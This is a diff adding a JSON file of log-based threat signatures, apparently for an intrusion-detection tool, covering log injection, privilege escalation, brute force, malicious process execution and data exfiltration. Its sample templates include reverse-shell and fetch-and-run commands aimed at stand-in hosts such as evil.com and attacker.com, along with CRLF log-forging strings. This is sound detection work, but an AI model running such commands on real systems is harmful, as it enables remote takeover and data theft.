@@ -1,0 +1,152 @@
+[
+  {
+    "name": "Log Injection Attack",
+    "category": "INJECTION",
+    "severity": "MEDIUM",
+    "description": "Attacks injecting malicious content into log files to forge entries or exploit log viewers",
+    "feature_profile": {
+      "entropy_range": [0.50, 0.75],
+      "special_char_ratio": [0.10, 0.30],
+      "length_range": [0.2, 0.6]
+    },
+    "signature_patterns": [
+      {"pattern": "\\n", "weight": 0.8},
+      {"pattern": "\\r\\n", "weight": 0.85},
+      {"pattern": "%0a", "weight": 0.85},
+      {"pattern": "%0d", "weight": 0.85},
+      {"pattern": "CRLF", "weight": 0.7}
+    ],
+    "templates": [
+      "legitimate entry\\n[CRITICAL] Fake admin login successful",
+      "user=admin%0a%0d[INFO] Password changed",
+      "action=view\\naction=delete",
+      "input\\r\\n[ERROR] System compromised"
+    ],
+    "mutations": [
+      {"type": "encoding", "variants": ["url", "unicode"]},
+      {"type": "substitution", "targets": ["\\n"], "variants": ["%0a", "%0A", "\\x0a"]}
+    ],
+    "base_valence": 0.80
+  },
+  {
+    "name": "Privilege Escalation Indicators",
+    "category": "AUTHENTICATION",
+    "severity": "CRITICAL",
+    "description": "Log patterns indicating attempted or successful privilege escalation",
+    "feature_profile": {
+      "entropy_range": [0.40, 0.65],
+      "special_char_ratio": [0.05, 0.20],
+      "length_range": [0.3, 0.7]
+    },
+    "signature_patterns": [
+      {"pattern": "sudo", "weight": 0.6},
+      {"pattern": "su root", "weight": 0.85},
+      {"pattern": "chmod 777", "weight": 0.8},
+      {"pattern": "chown root", "weight": 0.75},
+      {"pattern": "/etc/sudoers", "weight": 0.9},
+      {"pattern": "NOPASSWD", "weight": 0.9}
+    ],
+    "templates": [
+      "user attempted sudo access to /etc/shadow",
+      "su root failed for user guest",
+      "chmod 777 /var/www/html",
+      "modification to /etc/sudoers detected",
+      "NOPASSWD entry added for user www-data"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["sudo", "root", "NOPASSWD"]}
+    ],
+    "base_valence": 0.90
+  },
+  {
+    "name": "Brute Force Authentication",
+    "category": "AUTHENTICATION",
+    "severity": "HIGH",
+    "description": "Patterns indicating brute force or credential stuffing attacks",
+    "feature_profile": {
+      "entropy_range": [0.35, 0.55],
+      "special_char_ratio": [0.05, 0.15],
+      "repetition_range": [0.4, 0.8]
+    },
+    "signature_patterns": [
+      {"pattern": "authentication failure", "weight": 0.7},
+      {"pattern": "Failed password", "weight": 0.75},
+      {"pattern": "invalid user", "weight": 0.7},
+      {"pattern": "repeated login attempts", "weight": 0.85},
+      {"pattern": "account locked", "weight": 0.6}
+    ],
+    "templates": [
+      "Failed password for invalid user admin from 192.168.1.100",
+      "authentication failure; user=root rhost=10.0.0.1",
+      "PAM 5 more authentication failures",
+      "Maximum login attempts exceeded for user admin",
+      "Account locked after 10 failed attempts"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["failed", "invalid", "authentication"]}
+    ],
+    "base_valence": 0.85
+  },
+  {
+    "name": "Suspicious Process Execution",
+    "category": "MALWARE",
+    "severity": "HIGH",
+    "description": "Log entries indicating execution of suspicious or known-malicious processes",
+    "feature_profile": {
+      "entropy_range": [0.45, 0.70],
+      "special_char_ratio": [0.10, 0.30],
+      "length_range": [0.2, 0.6]
+    },
+    "signature_patterns": [
+      {"pattern": "/tmp/", "weight": 0.6},
+      {"pattern": "/dev/shm", "weight": 0.8},
+      {"pattern": "base64 -d", "weight": 0.85},
+      {"pattern": "wget http", "weight": 0.7},
+      {"pattern": "curl | sh", "weight": 0.9},
+      {"pattern": "nc -e", "weight": 0.95},
+      {"pattern": "python -c", "weight": 0.65}
+    ],
+    "templates": [
+      "execve(\"/tmp/.hidden/backdoor\")",
+      "process started: /dev/shm/miner",
+      "command: wget http://evil.com/shell.sh | sh",
+      "bash -c 'curl http://c2.server/payload | bash'",
+      "nc -e /bin/sh attacker.com 4444",
+      "python -c 'import socket,subprocess,os'"
+    ],
+    "mutations": [
+      {"type": "encoding", "variants": ["url", "hex"]},
+      {"type": "substitution", "targets": ["wget"], "variants": ["curl", "fetch"]}
+    ],
+    "base_valence": 0.90
+  },
+  {
+    "name": "Data Exfiltration Indicators",
+    "category": "EXPOSURE",
+    "severity": "CRITICAL",
+    "description": "Log patterns suggesting unauthorized data transfer or exfiltration",
+    "feature_profile": {
+      "entropy_range": [0.45, 0.70],
+      "special_char_ratio": [0.10, 0.25],
+      "length_range": [0.3, 0.7]
+    },
+    "signature_patterns": [
+      {"pattern": "large file transfer", "weight": 0.7},
+      {"pattern": "unusual outbound", "weight": 0.75},
+      {"pattern": "dns tunnel", "weight": 0.9},
+      {"pattern": "base64 encoded", "weight": 0.65},
+      {"pattern": "compressed archive sent", "weight": 0.8}
+    ],
+    "templates": [
+      "outbound transfer 500MB to external IP",
+      "DNS query: exfil.attacker.com TXT record",
+      "unusual data volume to port 443: 2GB",
+      "base64 encoded payload in DNS request",
+      "tar.gz archive uploaded to cloud storage"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["DNS", "TCP", "UDP"]}
+    ],
+    "base_valence": 0.92
+  }
+]
